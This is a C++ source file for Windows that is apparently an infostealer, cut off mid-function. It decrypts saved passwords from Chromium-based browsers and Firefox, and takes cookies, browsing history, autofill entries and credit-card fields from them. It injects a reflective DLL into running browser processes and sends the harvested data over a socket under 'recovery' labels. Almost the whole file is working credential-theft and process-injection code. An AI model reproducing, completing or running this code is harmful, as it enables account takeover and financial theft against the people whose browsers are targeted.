#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
#include <fstream>
#include <filesystem>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <regex>
#include <cctype>
#include <cwctype>
#include <shlobj.h>
#include <objbase.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <cstdlib>
#include "bootstrapper.h"
#include "json.hpp"
#include "sqlite3.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

// Protocol constants
#define PACKET_SIGNATURE          0x524E
#define PACKET_TYPE_RECOVERY_FILE 0x07

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t  type;
    uint32_t size;
};
#pragma pack(pop)

// --- BURAYA BASE64 ENCODED DLL VERİSİNİ YAPIŞTIRIN (proxydll.dll) ---
static const std::string EMBEDDED_DLL_BASE64 = "";

static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
    int in_len = (int)encoded_string.size();
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::vector<unsigned char> ret;
    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = (unsigned char)base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = (unsigned char)base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }
    return ret;
}

// --- Helper for sending recovery data ---
static bool send_recovery_data(SOCKET sock, const std::string& relPath, const void* data, size_t dataSize) {
    uint32_t pathLen = (uint32_t)relPath.size();
    uint32_t offset = 0;
    uint32_t payloadSize = 4 + pathLen + 4 + (uint32_t)dataSize;

    std::vector<unsigned char> packet;
    packet.resize(sizeof(PacketHeader) + payloadSize);

    PacketHeader* header = (PacketHeader*)packet.data();
    header->signature = PACKET_SIGNATURE;
    header->type = PACKET_TYPE_RECOVERY_FILE;
    header->size = payloadSize;

    unsigned char* p = packet.data() + sizeof(PacketHeader);
    memcpy(p, &pathLen, 4); p += 4;
    memcpy(p, relPath.c_str(), pathLen); p += pathLen;
    memcpy(p, &offset, 4); p += 4;
    if (dataSize > 0 && data) memcpy(p, data, dataSize);

    int totalSent = 0;
    int len = (int)packet.size();
    while (totalSent < len) {
        int sent = send(sock, (const char*)packet.data() + totalSent, len - totalSent, 0);
        if (sent == SOCKET_ERROR) return false;
        totalSent += sent;
    }
    return true;
}

static bool send_recovery_file(SOCKET sock, const std::string& relPath, const std::vector<unsigned char>& data) {
    return send_recovery_data(sock, relPath, data.data(), data.size());
}

static bool send_recovery_json(SOCKET sock, const std::string& relPath, const json& j) {
    std::string s = j.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
    return send_recovery_data(sock, relPath, s.data(), s.size());
}

static bool send_recovery_text(SOCKET sock, const std::string& relPath, const std::string& text) {
    return send_recovery_data(sock, relPath, text.data(), text.size());
}

static std::vector<unsigned char> read_file_to_vector(const fs::path& p) {
    std::ifstream f(p, std::ios::binary | std::ios::ate);
    if (!f.is_open()) return {};
    std::streamsize size = f.tellg();
    if (size <= 0) return {};
    f.seekg(0, std::ios::beg);
    std::vector<unsigned char> v(size);
    if (f.read((char*)v.data(), size)) return v;
    return {};
}

// --- Recovery Logic ---
struct PasswordData { std::string url, username, password; };
struct CookieData {
    std::string host, name, value, path;
    long long expires_utc;
    int is_secure, is_httponly, samesite;
};
struct HistoryData { std::string url, title; int visit_count; };
struct AutofillData { std::string name, value; };
struct ProfileData {
    std::string name;
    std::vector<PasswordData> passwords;
    std::vector<CookieData> cookies;
    std::vector<HistoryData> history;
    std::vector<AutofillData> autofill;
};

std::string sanitize_internal(const unsigned char* data, size_t size) {
    std::string output; output.reserve(size);
    for (size_t i = 0; i < size; ++i) {
        unsigned char c = data[i];
        if ((c < 32 && c != '\r' && c != '\n' && c != '\t') || c == 127) output += ' ';
        else output += (char)c;
    }
    return output;
}

std::string to_utf8_lossy(const std::vector<unsigned char>& input) { return sanitize_internal(input.data(), input.size()); }
std::string ensure_utf8(const std::string& input) { return sanitize_internal((const unsigned char*)input.data(), input.size()); }

std::vector<unsigned char> strip_signature(const std::vector<unsigned char>& data, bool force = false) {
    if (data.size() < 32) return data;
    if (force) return std::vector<unsigned char>(data.begin() + 32, data.end());
    int non_printable = 0; bool has_control = false;
    for (int i = 0; i < 32; i++) {
        unsigned char c = data[i];
        if (c < 32 && c != '\r' && c != '\n' && c != '\t') has_control = true;
        if (c < 32 || c > 126) non_printable++;
    }
    if (has_control || non_printable > 4) return std::vector<unsigned char>(data.begin() + 32, data.end());
    return data;
}

std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB output = { 0, nullptr };
    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
        std::vector<unsigned char> res(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData); return res;
    }
    return {};
}

std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
    if (data.size() < 15) return {};
    BCRYPT_ALG_HANDLE h_alg = nullptr; BCRYPT_KEY_HANDLE h_key = nullptr;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info; memset(&info, 0, sizeof(info));
    info.cbSize = sizeof(info); info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0) return {};
    if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
    if (BCryptGenerateSymmetricKey(h_alg, &h_key, nullptr, 0, (BYTE*)key.data(), (DWORD)key.size(), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
    std::vector<unsigned char> nonce(data.begin() + 3, data.begin() + 15);
    std::vector<unsigned char> ciphertext(data.begin() + 15, data.end() - 16);
    std::vector<unsigned char> tag(data.end() - 16, data.end());
    info.pbNonce = nonce.data(); info.cbNonce = (DWORD)nonce.size(); info.pbTag = tag.data(); info.cbTag = (DWORD)tag.size();
    std::vector<unsigned char> plaintext(ciphertext.size()); DWORD cb_plain = 0;
    if (BCryptDecrypt(h_key, ciphertext.data(), (DWORD)ciphertext.size(), &info, nullptr, 0, plaintext.data(), (DWORD)plaintext.size(), &cb_plain, 0) != 0) {
        BCryptDestroyKey(h_key); BCryptCloseAlgorithmProvider(h_alg, 0); return {};
    }
    BCryptDestroyKey(h_key); BCryptCloseAlgorithmProvider(h_alg, 0);
    plaintext.resize(cb_plain); return plaintext;
}

std::vector<unsigned char> decrypt_blob(const std::vector<unsigned char>& blob, const std::vector<unsigned char>& v10_key, const std::vector<unsigned char>& v20_key) {
    if (blob.empty()) return {};
    std::vector<unsigned char> dec; bool is_v20 = false;
    if (blob.size() > 3 && std::string((char*)blob.data(), 3) == "v20") {
        is_v20 = true; if (!v20_key.empty()) dec = aes_gcm_decrypt(v20_key, blob);
    } else if (blob.size() > 3 && std::string((char*)blob.data(), 3) == "v10") {
        if (!v10_key.empty()) dec = aes_gcm_decrypt(v10_key, blob);
    } else dec = decrypt_dpapi(blob);
    if (!dec.empty()) return strip_signature(dec, is_v20);
    return dec;
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string str(size, 0); WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &str[0], size, NULL, NULL);
    return str;
}

bool copy_file_locked(const fs::path& source, const fs::path& dest) {
    if (!fs::exists(source)) return false;
    for (int i = 0; i < 3; i++) {
        HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (h_src != INVALID_HANDLE_VALUE) {
            HANDLE h_dest = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
            if (h_dest != INVALID_HANDLE_VALUE) {
                char buffer[65536]; DWORD read, written; bool ok = false;
                while (ReadFile(h_src, buffer, sizeof(buffer), &read, nullptr) && read > 0) { WriteFile(h_dest, buffer, read, &written, nullptr); ok = true; }
                CloseHandle(h_src); CloseHandle(h_dest); if (ok) return true;
            } else CloseHandle(h_src);
        }
        if (i < 2) Sleep(50);
    }
    return false;
}

bool copy_db_with_sidecars(const fs::path& source_db, const fs::path& dest_db) {
    if (!copy_file_locked(source_db, dest_db)) return false;
    std::wstring src = source_db.wstring(), dst = dest_db.wstring();
    if (fs::exists(src + L"-wal")) copy_file_locked(src + L"-wal", dst + L"-wal");
    if (fs::exists(src + L"-shm")) copy_file_locked(src + L"-shm", dst + L"-shm");
    if (fs::exists(src + L"-journal")) copy_file_locked(src + L"-journal", dst + L"-journal");
    return true;
}

int open_db_for_extraction(const std::string& path, sqlite3** db, bool read_only = false) {
    int flags = SQLITE_OPEN_NOMUTEX;
    if (read_only) flags |= SQLITE_OPEN_READONLY;
    else flags |= SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE;
    int rc = sqlite3_open_v2(path.c_str(), db, flags, nullptr);
    if (rc == SQLITE_OK && !read_only) sqlite3_exec(*db, "PRAGMA wal_checkpoint(TRUNCATE);", nullptr, nullptr, nullptr);
    return rc;
}

void cleanup_db_temp(const fs::path& db_path) {
    std::error_code ec; fs::remove(db_path, ec);
    fs::remove(db_path.string() + "-wal", ec); fs::remove(db_path.string() + "-shm", ec); fs::remove(db_path.string() + "-journal", ec);
}

struct BrowserConfig {
    std::wstring name, exe_name, data_path_relative;
    std::vector<std::wstring> common_paths;
    bool use_injection, is_firefox_based;
    int csidl_folder;
};

const std::vector<BrowserConfig> BROWSERS = {
    {L"Chrome", L"chrome.exe", L"Google\\Chrome\\User Data", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}, true, false, CSIDL_LOCAL_APPDATA},
    {L"Edge", L"msedge.exe", L"Microsoft\\Edge\\User Data", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}, true, false, CSIDL_LOCAL_APPDATA},
    {L"Brave", L"brave.exe", L"BraveSoftware\\Brave-Browser\\User Data", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, true, false, CSIDL_LOCAL_APPDATA},
    {L"Opera", L"launcher.exe", L"Opera Software\\Opera Stable", {L"C:\\Program Files\\Opera\\launcher.exe"}, false, false, CSIDL_APPDATA},
    {L"Opera GX", L"launcher.exe", L"Opera Software\\Opera GX Stable", {L"C:\\Program Files\\Opera GX\\launcher.exe"}, false, false, CSIDL_APPDATA},
    {L"Yandex", L"browser.exe", L"Yandex\\YandexBrowser\\User Data", {L"C:\\Program Files\\Yandex\\YandexBrowser\\Application\\browser.exe", L"C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe"}, false, false, CSIDL_LOCAL_APPDATA},
    {L"Chromium", L"chrome.exe", L"Chromium\\User Data", {L"C:\\Program Files\\Chromium\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Chromium\\Application\\chrome.exe"}, false, false, CSIDL_LOCAL_APPDATA},
    {L"Firefox", L"firefox.exe", L"Mozilla\\Firefox", {L"C:\\Program Files\\Mozilla Firefox\\firefox.exe", L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"}, false, true, CSIDL_APPDATA},
    {L"Waterfox", L"waterfox.exe", L"Waterfox", {L"C:\\Program Files\\Waterfox\\waterfox.exe", L"C:\\Program Files (x86)\\Waterfox\\waterfox.exe"}, false, true, CSIDL_APPDATA},
    {L"LibreWolf", L"librewolf.exe", L"LibreWolf", {L"C:\\Program Files\\LibreWolf\\librewolf.exe", L"C:\\Program Files (x86)\\LibreWolf\\librewolf.exe"}, false, true, CSIDL_APPDATA},
    {L"Vivaldi", L"vivaldi.exe", L"Vivaldi\\User Data", {L"C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe", L"C:\\Program Files (x86)\\Vivaldi\\Application\\vivaldi.exe"}, true, false, CSIDL_LOCAL_APPDATA}
};

std::wstring find_browser_exe(const std::wstring& name) {
    for (const auto& b : BROWSERS) {
        if (b.name == name) {
            for (const auto& p : b.common_paths) if (fs::exists(p)) return p;
            std::vector<std::pair<HKEY, std::wstring>> keys = {
                {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + b.exe_name},
                {HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + b.exe_name},
                {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Clients\\StartMenuInternet\\" + b.name + L"\\shell\\open\\command"},
                {HKEY_CURRENT_USER, L"SOFTWARE\\Clients\\StartMenuInternet\\" + b.name + L"\\shell\\open\\command"}
            };
            for (auto& k : keys) {
                HKEY hKey;
                if (RegOpenKeyExW(k.first, k.second.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                    wchar_t buf[MAX_PATH]; DWORD sz = sizeof(buf);
                    if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                        std::wstring p = buf;
                        if (!p.empty() && p[0] == L'\"') { p = p.substr(1); size_t end = p.find(L'\"'); if (end != std::wstring::npos) p = p.substr(0, end); }
                        if (fs::exists(p)) { RegCloseKey(hKey); return p; }
                    }
                    RegCloseKey(hKey);
                }
            }
            wchar_t local[MAX_PATH]; if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) == S_OK) {
                std::vector<fs::path> bases = { fs::path(local) / L"Programs", L"C:\\Program Files", L"C:\\Program Files (x86)" };
                for (auto& base : bases) {
                    fs::path target;
                    if (b.name == L"Chrome") target = base / L"Google\\Chrome\\Application\\chrome.exe";
                    else if (b.name == L"Edge") target = base / L"Microsoft\\Edge\\Application\\msedge.exe";
                    else if (b.name == L"Brave") target = base / L"BraveSoftware\\Brave-Browser\\Application\\brave.exe";
                    else if (b.name == L"Opera") target = base / L"Opera\\launcher.exe";
                    else if (b.name == L"Opera GX") target = base / L"Opera GX\\launcher.exe";
                    else if (b.name == L"Yandex") target = base / L"Yandex\\YandexBrowser\\Application\\browser.exe";
                    else if (b.name == L"Chromium") target = base / L"Chromium\\Application\\chrome.exe";
                    else if (b.name == L"Firefox") target = base / L"Mozilla Firefox\\firefox.exe";
                    else if (b.name == L"Waterfox") target = base / L"Waterfox\\waterfox.exe";
                    else if (b.name == L"LibreWolf") target = base / L"LibreWolf\\librewolf.exe";
                    else if (b.name == L"Vivaldi") target = base / L"Vivaldi\\Application\\vivaldi.exe";
                    if (!target.empty() && fs::exists(target)) return target.wstring();
                }
            }
        }
    }
    return L"";
}

DWORD find_main_process(const std::wstring& exe_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W entry; entry.dwSize = sizeof(entry); std::vector<DWORD> pids;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            std::wstring cur = entry.szExeFile, target = exe_name;
            std::transform(cur.begin(), cur.end(), cur.begin(), ::towlower); std::transform(target.begin(), target.end(), target.begin(), ::towlower);
            if (cur == target) pids.push_back(entry.th32ProcessID);
        } while (Process32NextW(snapshot, &entry));
    }
    DWORD main_pid = 0;
    for (DWORD pid : pids) { HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (h) { main_pid = pid; CloseHandle(h); break; } }
    CloseHandle(snapshot); return main_pid;
}

void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
    if (dll_bytes.size() < sizeof(IMAGE_DOS_HEADER)) return;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)dll_bytes.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(dll_bytes.data() + dos->e_lfanew);
    void* remote_base = VirtualAllocEx(h_process, (void*)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    bool reloc = false; if (!remote_base) { reloc = true; remote_base = VirtualAllocEx(h_process, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); }
    if (!remote_base) return;
    if (!WriteProcessMemory(h_process, remote_base, dll_bytes.data(), nt->OptionalHeader.SizeOfHeaders, NULL)) { VirtualFreeEx(h_process, remote_base, 0, MEM_RELEASE); return; }
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((size_t)nt + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].PointerToRawData == 0 || sections[i].SizeOfRawData == 0) continue;
        WriteProcessMemory(h_process, (void*)((size_t)remote_base + sections[i].VirtualAddress), (void*)(dll_bytes.data() + sections[i].PointerToRawData), sections[i].SizeOfRawData, NULL);
    }
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    DllInfo info = { remote_base, (LoadLibraryA_t)GetProcAddress(k32, "LoadLibraryA"), (GetProcAddress_t)GetProcAddress(k32, "GetProcAddress"), reloc };
    size_t bs_size = (size_t)realign_pe_end - (size_t)realign_pe; if (bs_size == 0) bs_size = 4096;
    void* remote_bs = VirtualAllocEx(h_process, NULL, sizeof(DllInfo) + bs_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_bs) return;
    WriteProcessMemory(h_process, remote_bs, &info, sizeof(DllInfo), NULL);
    WriteProcessMemory(h_process, (void*)((size_t)remote_bs + sizeof(DllInfo)), (void*)realign_pe, bs_size, NULL);
    HANDLE thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)((size_t)remote_bs + sizeof(DllInfo)), remote_bs, 0, NULL);
    if (thread) { WaitForSingleObject(thread, INFINITE); CloseHandle(thread); }
    VirtualFreeEx(h_process, remote_bs, 0, MEM_RELEASE);
}

std::string get_sqlite_text(sqlite3_stmt* stmt, int col) { const unsigned char* txt = sqlite3_column_text(stmt, col); return txt ? std::string((const char*)txt) : ""; }

typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
struct SECItem { int type; unsigned char* data; unsigned int len; };
typedef SECStatus(*NSSInit_t)(const char*); typedef SECStatus(*NSSShutdown_t)(void); typedef SECStatus(*PK11SDRDecrypt_t)(SECItem*, SECItem*, void*);

void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
    wchar_t sz_path[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz_path) != S_OK) return;
    fs::path data_path = fs::path(sz_path) / browser.data_path_relative; if (!fs::exists(data_path)) return;
    std::vector<fs::path> profile_paths; fs::path ini_path = data_path / "profiles.ini"; std::error_code ec;
    if (fs::exists(ini_path)) {
        try {
            std::ifstream file(ini_path);
            if (file.is_open()) {
                std::string line, section; std::map<std::string, std::map<std::string, std::string>> sections;
                while (std::getline(file, line)) {
                    if (!line.empty() && line.back() == '\r') line.pop_back(); if (line.empty()) continue;
                    if (line[0] == '[') { size_t end = line.find(']'); if (end != std::string::npos) section = line.substr(1, end - 1); }
                    else { size_t pos = line.find('='); if (pos != std::string::npos) sections[section][line.substr(0, pos)] = line.substr(pos + 1); }
                }
                for (auto const& [s_name, props] : sections) {
                    if (props.count("Path")) {
                        bool is_rel = (props.count("IsRelative") && props.at("IsRelative") == "1");
                        std::string p_str = props.at("Path"); fs::path p = is_rel ? (data_path / p_str) : fs::path(p_str);
                        if (!fs::exists(p)) p = data_path / "Profiles" / p_str;
                        if (fs::exists(p)) { bool dup = false; for(auto& existing : profile_paths) { try { if(fs::equivalent(existing, p)) dup = true; } catch(...) {} } if (!dup) profile_paths.push_back(p); }
                    }
                }
            }
        } catch (...) {}
    }
    {
        std::vector<fs::path> roots = { data_path, data_path / "Profiles" };
        wchar_t local_appdata[MAX_PATH]; if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata) == S_OK) {
            fs::path store_base = fs::path(local_appdata) / "Packages";
            for (const auto& entry : fs::directory_iterator(store_base, ec)) { if (entry.is_directory() && entry.path().filename().string().find("Mozilla.Firefox") != std::string::npos) { fs::path sp = entry.path() / "LocalCache" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"; if (fs::exists(sp)) roots.push_back(sp); } }
        }
        for (auto& p_root : roots) {
            if (fs::exists(p_root)) { for (const auto& entry : fs::directory_iterator(p_root, ec)) { if (entry.is_directory() && (fs::exists(entry.path() / "logins.json") || fs::exists(entry.path() / "key4.db"))) { bool dup = false; for(auto& existing : profile_paths) { try { if(fs::equivalent(existing, entry.path())) dup = true; } catch(...) {} } if (!dup) profile_paths.push_back(entry.path()); } } }
        }
    }
    if (profile_paths.empty()) return;

    std::wstring b_exe = find_browser_exe(browser.name);
    if (b_exe.empty()) { DWORD pid = find_main_process(browser.exe_name); if (pid) { HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); if (h) { wchar_t buf[MAX_PATH]; DWORD sz = MAX_PATH; if (QueryFullProcessImageNameW(h, 0, buf, &sz)) b_exe = buf; CloseHandle(h); } } }
    if (b_exe.empty()) return;
    fs::path bin_dir = fs::path(b_exe).parent_path();
    HMODULE h_nss = NULL; NSSInit_t f_NSS_Init = nullptr; NSSShutdown_t f_NSS_Shutdown = nullptr; PK11SDRDecrypt_t f_PK11SDR_Decrypt = nullptr;
    wchar_t saved_cwd[MAX_PATH]; GetCurrentDirectoryW(MAX_PATH, saved_cwd); SetCurrentDirectoryW(bin_dir.c_str());
    h_nss = LoadLibraryW(L"nss3.dll");
    if (h_nss) { f_NSS_Init = (NSSInit_t)GetProcAddress(h_nss, "NSS_Init"); f_NSS_Shutdown = (NSSShutdown_t)GetProcAddress(h_nss, "NSS_Shutdown"); f_PK11SDR_Decrypt = (PK11SDRDecrypt_t)GetProcAddress(h_nss, "PK11SDR_Decrypt"); }
    SetCurrentDirectoryW(saved_cwd);

    wchar_t temp_base[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, temp_base);
    fs::path temp_dir = fs::path(temp_base) / "Temp" / ("firefox_db_" + std::to_string(GetTickCount())); fs::create_directories(temp_dir, ec);

    for (const auto& p_path : profile_paths) {
        std::string p_name = p_path.filename().string(); ProfileData p_data; p_data.name = p_name;
        std::string p_name_sanit = p_name; std::replace(p_name_sanit.begin(), p_name_sanit.end(), '/', '_'); std::replace(p_name_sanit.begin(), p_name_sanit.end(), '\\', '_'); std::replace(p_name_sanit.begin(), p_name_sanit.end(), ':', '_');
        std::string b_name_utf8 = wstring_to_utf8(browser.name);

        if (h_nss && f_NSS_Init && f_PK11SDR_Decrypt && f_NSS_Shutdown) {
            fs::path min_p = temp_dir / (p_name_sanit + "_nss"); fs::create_directories(min_p, ec);
            copy_file_locked(p_path / "key4.db", min_p / "key4.db"); copy_file_locked(p_path / "key3.db", min_p / "key3.db"); copy_file_locked(p_path / "cert9.db", min_p / "cert9.db"); copy_file_locked(p_path / "logins.json", min_p / "logins.json");
            SetCurrentDirectoryW(bin_dir.c_str()); std::string p_str = min_p.string(); std::replace(p_str.begin(), p_str.end(), '\\', '/'); if (p_str.back() == '/') p_str.pop_back();
            bool inited = false; if (fs::exists(min_p / "key4.db")) { if (f_NSS_Init(("sql:" + p_str).c_str()) == SECSuccess) inited = true; }
            if (inited) {
                fs::path login_f = min_p / "logins.json"; if (fs::exists(login_f)) {
                    try {
                        std::ifstream lf(login_f);
                        if (lf.is_open()) {
                            json lj = json::parse(lf, nullptr, false);
                            if (!lj.is_discarded() && lj.contains("logins")) {
                                for (auto& login : lj["logins"]) {
                                    std::string enc_u = login["encryptedUsername"], enc_p = login["encryptedPassword"], url = login["hostname"];
                                    auto db_u = base64_decode(enc_u); auto db_p = base64_decode(enc_p);
                                    SECItem in_u = { 0, db_u.data(), (unsigned int)db_u.size() }, out_u = { 0, nullptr, 0 }, in_p = { 0, db_p.data(), (unsigned int)db_p.size() }, out_p = { 0, nullptr, 0 };
                                    std::string u = enc_u, p = enc_p;
                                    if (f_PK11SDR_Decrypt(&in_u, &out_u, nullptr) == SECSuccess && out_u.data) u = std::string((char*)out_u.data, out_u.len);
                                    if (f_PK11SDR_Decrypt(&in_p, &out_p, nullptr) == SECSuccess && out_p.data) p = std::string((char*)out_p.data, out_p.len);
                                    p_data.passwords.push_back({ url, u, p });
                                }
                            }
                        }
                    } catch (...) {}
                }
                f_NSS_Shutdown();
            }
            SetCurrentDirectoryW(saved_cwd);
        }
        fs::path c_db = p_path / "cookies.sqlite"; fs::path tc_db = temp_dir / (p_name_sanit + "_cook.tmp");
        if (copy_db_with_sidecars(c_db, tc_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(tc_db.wstring()), &db, true) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) { p_data.cookies.reserve(500); while (sqlite3_step(stmt) == SQLITE_ROW) p_data.cookies.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1), get_sqlite_text(stmt, 2), get_sqlite_text(stmt, 3), (sqlite3_column_int64(stmt, 4) + 11644473600LL) * 1000000, sqlite3_column_int(stmt, 5), sqlite3_column_int(stmt, 6), 0 }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(tc_db); }
        fs::path h_db = p_path / "places.sqlite"; fs::path th_db = temp_dir / (p_name_sanit + "_hist.tmp");
        if (copy_db_with_sidecars(h_db, th_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(th_db.wstring()), &db, true) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM moz_places LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) { p_data.history.reserve(500); while (sqlite3_step(stmt) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1), (int)sqlite3_column_int(stmt, 2) }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(th_db); }
        fs::path a_db = p_path / "formhistory.sqlite"; fs::path ta_db = temp_dir / (p_name_sanit + "_auto.tmp");
        if (copy_db_with_sidecars(a_db, ta_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(ta_db.wstring()), &db, true) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT fieldname, value FROM moz_formhistory", -1, &stmt, nullptr) == SQLITE_OK) { p_data.autofill.reserve(100); while (sqlite3_step(stmt) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1) }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(ta_db); }
        fs::path aj_path = p_path / "autofill-profiles.json";
        if (fs::exists(aj_path)) {
            try {
                std::ifstream f(aj_path);
                if (f.is_open()) {
                    json aj = json::parse(f, nullptr, false);
                    if (!aj.is_discarded()) {
                        if (aj.contains("addresses")) for (auto& i : aj["addresses"]) for (auto it = i.begin(); it != i.end(); ++it) if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() });
                        if (aj.contains("creditCards")) for (auto& i : aj["creditCards"]) for (auto it = i.begin(); it != i.end(); ++it) if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() });
                    }
                }
            } catch (...) {}
        }
        if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
